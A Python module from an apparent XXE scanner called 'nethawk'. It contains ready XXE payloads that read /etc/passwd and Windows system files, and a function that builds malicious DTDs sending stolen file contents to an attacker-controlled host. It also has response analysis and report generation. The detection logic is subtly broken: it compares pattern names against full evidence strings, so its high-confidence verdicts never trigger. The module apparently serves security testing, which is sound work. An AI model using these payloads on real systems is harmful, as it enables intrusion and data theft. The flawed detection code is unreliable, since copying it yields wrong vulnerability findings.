#!/usr/bin/env python3

import os
import re
import json
import logging
import random
import string
from typing import List, Dict, Any, Optional
from datetime import datetime
import csv
from pathlib import Path
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup

logger = logging.getLogger('nethawk')

def generate_xxe_payloads() -> List[str]:
    """
    Generate a list of XXE payloads for testing
    
    Returns:
        List of XXE payload strings
    """
    payloads = [
        # Basic entity test
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "XXE-CANARY" >]>
<foo>&xxe;</foo>""",
        
        # Local file inclusion - /etc/passwd
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>""",
        
        # Local file inclusion - Windows hosts file
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts" >]>
<foo>&xxe;</foo>""",
        
        # Parameter entities
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY % dummy "<!ENTITY &#x25; internal 'Processed: %xxe;'>">
%dummy;
%internal;
]>
<foo>Test</foo>""",
        
        # Out-of-band XXE
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker-controlled-website.com/evil.dtd">
%xxe;
]>
<foo>Out-of-band test</foo>""",
        
        # Error-based XXE
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo>Error test</foo>""",
        
        # XXE with CDATA
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
<!ENTITY combined "<![CDATA[%xxe;]]>" >
]>
<foo>&combined;</foo>""",
        
        # XXE with external DTD
        """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo SYSTEM "http://attacker-controlled-website.com/evil.dtd">
<foo>External DTD test</foo>"""
    ]
    
    return payloads

def create_evil_dtd(payload_type: str = "oob", data_file: str = "/etc/passwd") -> str:
    """
    Create an evil DTD for out-of-band XXE attacks
    
    Args:
        payload_type: Type of payload ("oob", "error", "blind")
        data_file: File to exfiltrate
        
    Returns:
        String containing the evil DTD content
    """
    if payload_type == "oob":
        # Out-of-band XXE - sends data to attacker's server
        return f"""<!ENTITY % file SYSTEM "file://{data_file}">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker-controlled-website.com/?data=%file;'>">
%all;"""
    
    elif payload_type == "error":
        # Error-based XXE - forces an error containing file contents
        return f"""<!ENTITY % file SYSTEM "file://{data_file}">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;"""
    
    elif payload_type == "blind":
        # Blind XXE - data exfiltration through timing attacks
        return f"""<!ENTITY % file SYSTEM "file://{data_file}">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-controlled-website.com/?data=%file;'>">
%eval;
%exfil;"""
    
    else:
        # Default to a simple payload
        return f"""<!ENTITY % file SYSTEM "file://{data_file}">
<!ENTITY % send "<!ENTITY exfil SYSTEM 'http://attacker-controlled-website.com/?data=%file;'>">
%send;"""

def analyze_xxe_response(response_text: str) -> Dict[str, Any]:
    """
    Analyze response text for signs of XXE vulnerability
    
    Args:
        response_text: Response text to analyze
        
    Returns:
        Dictionary with analysis results
    """
    # Patterns to look for in responses
    patterns = {
        'passwd_file': r"root:.*:0:0:",  # Pattern in /etc/passwd
        'nobody': r"nobody:.*:65534",  # Pattern in /etc/passwd
        'daemon': r"daemon:.*:1:1:",  # Pattern in /etc/passwd
        'windows_hosts': r"localhost\s+127.0.0.1",  # Pattern in Windows hosts file
        'canary': r"XXE-CANARY",  # Test entity value
        'entity_syntax': r"<!ENTITY",  # XML parsing errors that might leak details
        'dtd_prohibited': r"DTD is prohibited",  # XML parsing errors that confirm XXE is disabled
        'doctype_prohibited': r"DOCTYPE is prohibited"  # XML parsing errors that confirm XXE is disabled
    }
    
    # Check for patterns
    evidence = []
    for name, pattern in patterns.items():
        if re.search(pattern, response_text, re.IGNORECASE):
            evidence.append(f"Found pattern '{name}' in response")
    
    # Check if the response seems to contain XML parsing errors
    xml_errors = [
        "XML parsing error",
        "syntax error",
        "bad XML",
        "malformed XML",
        "XML document structures must start and end within the same entity",
        "Start tag expected"
    ]
    
    for error in xml_errors:
        if error.lower() in response_text.lower():
            evidence.append(f"XML error: '{error}'")
    
    # Determine if vulnerable based on evidence
    is_vulnerable = False
    confidence = "Low"
    details = "No clear evidence of XXE vulnerability"
    
    if any(pattern in evidence for pattern in ['passwd_file', 'windows_hosts', 'nobody', 'daemon']):
        is_vulnerable = True
        confidence = "High"
        details = "Found sensitive file contents in response"
    elif "canary" in evidence:
        is_vulnerable = True
        confidence = "High"
        details = "Entity was successfully processed"
    elif any(pattern in evidence for pattern in ['entity_syntax']):
        is_vulnerable = True
        confidence = "Medium"
        details = "Response contains XML entity syntax, suggesting possible information leakage"
    elif any(pattern in evidence for pattern in ['dtd_prohibited', 'doctype_prohibited']):
        is_vulnerable = False
        confidence = "High"
        details = "XML processing appears to have proper protections enabled"
    elif len(evidence) > 0:
        is_vulnerable = True
        confidence = "Low"
        details = "Response contains patterns that might indicate XXE, but further verification needed"
    
    return {
        'vulnerable': is_vulnerable,
        'confidence': confidence,
        'evidence': ", ".join(evidence) if evidence else "No direct evidence found",
        'details': details
    }

def get_xxe_vulnerability_description() -> Dict[str, Any]:
    """
    Get a detailed description of XXE vulnerability
    
    Returns:
        Dictionary with vulnerability description details
    """
    return {
        'name': 'XML External Entity (XXE) Injection',
        'description': 'XML External Entity (XXE) injection is a type of attack against applications that parse XML input. '
                       'This attack occurs when untrusted XML input containing a reference to an external entity is processed '
                       'by a weakly configured XML parser. This can lead to disclosure of confidential data, denial of service, '
                       'server-side request forgery, port scanning, and other system impacts.',
        'impact': 'Successful XXE exploitation can lead to disclosure of confidential data, denial of service, '
                  'server-side request forgery, port scanning from the perspective of the machine where the parser is located, '
                  'and other system impacts.',
        'remediation': '- Use less complex data formats like JSON where possible\n'
                       '- Patch or upgrade XML processors and libraries\n'
                       '- Disable XML external entity and DTD processing in all XML parsers\n'
                       '- Implement positive server-side validation, filtering, or sanitization\n'
                       '- Verify that XML or XSL file upload functionality validates incoming XML',
        'references': [
            'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
            'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
            'https://cwe.mitre.org/data/definitions/611.html'
        ],
        'cwe_id': 'CWE-611',
        'risk_score': 8.6,
        'severity': 'High'
    }

def generate_xxe_report(vulnerabilities: List[Dict[str, Any]], target_url: str, 
                        output_format: str = 'json', output_dir: str = 'reports') -> str:
    """
    Generate a report of XXE vulnerabilities
    
    Args:
        vulnerabilities: List of vulnerability dictionaries
        target_url: Target URL that was scanned
        output_format: Output format (json, html, csv)
        output_dir: Directory to save the report
        
    Returns:
        Path to the generated report
    """
    # Create reports directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    
    # Extract domain from target URL
    from urllib.parse import urlparse
    domain = urlparse(target_url).netloc or target_url
    
    # Generate timestamp
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Prepare report data
    report_data = {
        'scan_info': {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerability_type': 'XXE Injection',
            'total_vulnerabilities': len(vulnerabilities)
        },
        'vulnerabilities': vulnerabilities,
        'summary': {
            'high_severity': len([v for v in vulnerabilities if v.get('severity') == 'High']),
            'medium_severity': len([v for v in vulnerabilities if v.get('severity') == 'Medium']),
            'low_severity': len([v for v in vulnerabilities if v.get('severity') == 'Low'])
        },
        'description': get_xxe_vulnerability_description()
    }
    
    # Generate report based on format
    if output_format.lower() == 'json':
        filename = f"{output_dir}/{domain}_xxe_scan_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        logger.info(f"JSON report saved to {filename}")
        return filename
        
    elif output_format.lower() == 'html':
        filename = f"{output_dir}/{domain}_xxe_scan_{timestamp}.html"
        
        # Generate a simple HTML report
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>XXE Vulnerability Scan Report - {domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        h1, h2, h3 {{ color: #444; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .summary {{ background-color: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
        .vulnerability {{ background-color: #fff; border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 15px; }}
        .high {{ border-left: 5px solid #d9534f; }}
        .medium {{ border-left: 5px solid #f0ad4e; }}
        .low {{ border-left: 5px solid #5bc0de; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; }}
        pre {{ background-color: #f5f5f5; padding: 10px; border-radius: 3px; overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>XXE Vulnerability Scan Report</h1>
        <div class="summary">
            <h2>Scan Summary</h2>
            <p><strong>Target:</strong> {target_url}</p>
            <p><strong>Scan Date:</strong> {report_data['scan_info']['timestamp']}</p>
            <p><strong>Total Vulnerabilities:</strong> {len(vulnerabilities)}</p>
            <p><strong>High Severity:</strong> {report_data['summary']['high_severity']}</p>
            <p><strong>Medium Severity:</strong> {report_data['summary']['medium_severity']}</p>
            <p><strong>Low Severity:</strong> {report_data['summary']['low_severity']}</p>
        </div>
        
        <h2>About XXE Vulnerabilities</h2>
        <div class="vulnerability">
            <p><strong>Description:</strong> {report_data['description']['description']}</p>
            <p><strong>Impact:</strong> {report_data['description']['impact']}</p>
            <p><strong>Remediation:</strong></p>
            <pre>{report_data['description']['remediation']}</pre>
            <p><strong>References:</strong></p>
            <ul>
"""

        # Add references
        for ref in report_data['description']['references']:
            html_content += f"                <li><a href='{ref}' target='_blank'>{ref}</a></li>\n"
        
        html_content += """            </ul>
        </div>
        
        <h2>Detected Vulnerabilities</h2>
"""

        # Add vulnerabilities
        if vulnerabilities:
            for i, vuln in enumerate(vulnerabilities):
                severity_class = vuln.get('severity', 'Medium').lower()
                html_content += f"""
        <div class="vulnerability {severity_class}">
            <h3>Vulnerability #{i+1} - {vuln.get('vulnerability_type', 'XXE Injection')}</h3>
            <p><strong>URL:</strong> {vuln.get('url', 'N/A')}</p>
            <p><strong>Method:</strong> {vuln.get('method', 'N/A')}</p>
            <p><strong>Severity:</strong> {vuln.get('severity', 'N/A')}</p>
            <p><strong>Confidence:</strong> {vuln.get('confidence', 'N/A')}</p>
            <p><strong>Evidence:</strong> {vuln.get('evidence', 'N/A')}</p>
            <p><strong>Details:</strong> {vuln.get('details', 'N/A')}</p>
            <p><strong>Payload:</strong></p>
            <pre>{vuln.get('payload', 'N/A')}</pre>
        </div>
"""
        else:
            html_content += "<p>No vulnerabilities detected.</p>\n"
        
        # Close HTML tags
        html_content += """
    </div>
</body>
</html>
"""
        
        with open(filename, 'w') as f:
            f.write(html_content)
        logger.info(f"HTML report saved to {filename}")
        return filename
        
    elif output_format.lower() == 'csv':
        filename = f"{output_dir}/{domain}_xxe_scan_{timestamp}.csv"
        
        with open(filename, 'w', newline='') as f:
            writer = csv.writer(f)
            # Write header
            writer.writerow(['#', 'URL', 'Method', 'Vulnerability Type', 'Severity', 'Confidence', 'Evidence', 'Details'])
            
            # Write vulnerabilities
            for i, vuln in enumerate(vulnerabilities):
                writer.writerow([
                    i+1,
                    vuln.get('url', 'N/A'),
                    vuln.get('method', 'N/A'),
                    vuln.get('vulnerability_type', 'XXE Injection'),
                    vuln.get('severity', 'N/A'),
                    vuln.get('confidence', 'N/A'),
                    vuln.get('evidence', 'N/A'),
                    vuln.get('details', 'N/A')
                ])
        
        logger.info(f"CSV report saved to {filename}")
        return filename
    
    else:
        logger.warning(f"Unsupported report format: {output_format}. Defaulting to JSON.")
        return generate_xxe_report(vulnerabilities, target_url, 'json', output_dir)

def is_xml_response(response_headers: Dict[str, str], response_body: str) -> bool:
    """
    Check if a response is likely to be XML
    
    Args:
        response_headers: Response headers
        response_body: Response body
        
    Returns:
        Boolean indicating if response is XML
    """
    # Check Content-Type header
    content_type = response_headers.get('Content-Type', '').lower()
    if any(xml_type in content_type for xml_type in ['application/xml', 'text/xml', '+xml']):
        return True
    
    # Check if the body starts with XML declaration
    if response_body.strip().startswith('<?xml'):
        return True
    
    # Try to parse as XML
    try:
        ET.fromstring(response_body)
        return True
    except:
        pass
    
    # Check for XML-like patterns
    xml_patterns = [
        r'<\?xml\s+version=["\']\d+\.\d+["\']',
        r'<([a-zA-Z0-9]+:)?[a-zA-Z0-9]+\s+xmlns',
        r'<!DOCTYPE\s+[^>]+>'
    ]
    
    for pattern in xml_patterns:
        if re.search(pattern, response_body):
            return True
    
    return False 